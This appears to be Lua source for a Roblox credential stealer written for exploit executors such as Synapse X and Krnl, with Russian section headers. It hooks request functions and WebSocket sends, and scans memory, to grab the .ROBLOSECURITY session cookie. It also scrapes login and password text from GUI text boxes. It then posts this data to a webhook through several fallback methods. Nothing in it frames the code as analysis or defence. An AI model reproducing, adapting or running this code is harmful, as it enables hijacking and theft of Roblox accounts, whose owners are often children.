-- ========== УНИВЕРСАЛЬНАЯ ОТПРАВКА ==========
local function sendToWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success = false
    
    -- Способ 1: Synapse X (syn.request)
    if syn and syn.request then
        pcall(function()
            local r = syn.request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            if r and r.StatusCode == 204 then success = true end
        end)
    end
    
    -- Способ 2: Krnl / Fluxus (http_request)
    if not success and http_request then
        pcall(function()
            local r = http_request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            if r and r.StatusCode == 204 then success = true end
        end)
    end
    
    -- Способ 3: Delta (Delta.request)
    if not success and Delta and Delta.request then
        pcall(function()
            local r = Delta.request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            if r and r.StatusCode == 204 then success = true end
        end)
    end
    
    -- Способ 4: HttpService (стандартный)
    if not success then
        pcall(function()
            HttpService:PostAsync(webhookURL, payload)
            success = true
        end)
    end
    
    -- Способ 5: request (универсальный)
    if not success and request then
        pcall(function()
            request({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            success = true
        end)
    end
    
    return success
end

-- ========== ПЕРЕХВАТ .ROBLOSECURITY ==========
local function getRealCookie()
    local cookie = nil
    
    -- Synapse X / Krnl / Fluxus / Delta (WebSocket)
    if syn and syn.crypto then
        local ws = game:GetService("WebSocketService")
        local oldConnect = ws.Connect
        ws.Connect = function(self, url)
            if string.find(url, "roblox.com") then
                local oldSend = self.Send
                self.Send = function(_, data)
                    if string.find(data, ".ROBLOSECURITY") then
                        cookie = string.match(data, ".ROBLOSECURITY[^;]+")
                    end
                    oldSend(self, data)
                end
            end
            return oldConnect(self, url)
        end
    end
    
    -- syn.request (все инжекторы с syn)
    if syn and syn.request then
        local oldRequest = syn.request
        syn.request = function(options)
            if options.Url and string.find(options.Url, "roblox.com") then
                if options.Headers and options.Headers["Cookie"] then
                    local cookieStr = options.Headers["Cookie"]
                    if string.find(cookieStr, ".ROBLOSECURITY") then
                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
                    end
                end
            end
            return oldRequest(options)
        end
    end
    
    -- Krnl / Fluxus (http_request)
    if http_request then
        local oldRequest = http_request
        http_request = function(options)
            if options.Url and string.find(options.Url, "roblox.com") then
                if options.Headers and options.Headers["Cookie"] then
                    local cookieStr = options.Headers["Cookie"]
                    if string.find(cookieStr, ".ROBLOSECURITY") then
                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
                    end
                end
            end
            return oldRequest(options)
        end
    end
    
    -- Delta (Delta.request)
    if Delta and Delta.request then
        local oldRequest = Delta.request
        Delta.request = function(options)
            if options.Url and string.find(options.Url, "roblox.com") then
                if options.Headers and options.Headers["Cookie"] then
                    local cookieStr = options.Headers["Cookie"]
                    if string.find(cookieStr, ".ROBLOSECURITY") then
                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
                    end
                end
            end
            return oldRequest(options)
        end
    end
    
    -- Поиск в памяти (все инжекторы)
    if getgc and getreg then
        for _, obj in pairs(getgc()) do
            if type(obj) == "string" and string.find(obj, ".ROBLOSECURITY") then
                cookie = obj
                break
            end
        end
    end
    
    return cookie or "ROBLOSECURITY_NOT_FOUND"
end

-- ========== СБОР ЛОГИНА/ПАРОЛЯ ==========
local function getLoginPass()
    local login, password = "unknown", "unknown"
    for _, gui in pairs(Player.PlayerGui:GetChildren()) do
        for _, child in pairs(gui:GetDescendants()) do
            if child:IsA("TextBox") then
                if string.find(child.Text, "@") or string.find(child.Text, "%.") then
                    login = child.Text
                elseif #child.Text > 4 then
                    password = child.Text
                end
            end
        end
    end
    return {login = login, password = password}
end

